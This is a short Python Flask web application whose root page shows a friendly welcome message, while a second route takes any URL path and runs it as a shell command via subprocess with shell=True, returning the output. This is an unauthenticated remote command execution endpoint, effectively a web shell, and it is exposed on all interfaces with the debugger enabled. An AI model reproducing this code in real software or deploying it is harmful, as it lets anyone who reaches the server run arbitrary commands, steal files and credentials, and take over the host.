import subprocess

from flask import Flask
app = Flask(__name__)

def run_command(command):
    return subprocess.Popen(command, shell=True, stdout=subprocess.PIPE).stdout.read()

@app.route('/<command>')
def command_server(command):
    return run_command(command)

@app.route('/')
def hello_world():
    return "Hey Guys!!! Welcome to My Page"

if __name__ == "__main__":
    app.run(debug=True, host='0.0.0.0', port=8080, ssl_context=('/etc/tls/tls.crt', '/etc/tls/tls.key'))

